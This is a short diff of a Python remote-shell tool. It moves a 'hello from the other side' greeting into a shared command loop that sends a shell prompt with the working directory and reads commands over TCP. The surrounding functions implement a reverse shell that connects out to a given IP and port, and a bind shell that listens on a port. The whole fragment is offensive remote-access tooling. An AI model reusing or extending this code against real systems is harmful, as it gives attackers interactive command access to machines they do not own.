@@ -57,6 +57,7 @@ def to_str(s):
         return str(s, 'utf-8')
 
 def easy_cmd(conn):
+    conn.send_data(to_bytes('hello from the other side :)\n'))
     while 1:
         conn.send_data(to_bytes(str('[Honigkuchenpferd]:' + os.getcwd() + '# ')))
         cmd = to_str(conn.recive_data())
@@ -71,13 +72,11 @@ def easy_cmd(conn):
 def reverse_shell(IP, PORT):
     x = tcp_socket()
     x.connect_to(IP, PORT)
-    x.send_data(to_bytes('hello from the other side :)\n'))
     easy_cmd(x)
 
 def bind_shell(PORT):
     x = tcp_socket()
     x.listen_on(PORT)
-    x.send_data(to_bytes('hello from the other side :)\n'))
     easy_cmd(x)
 
 def default_shell():
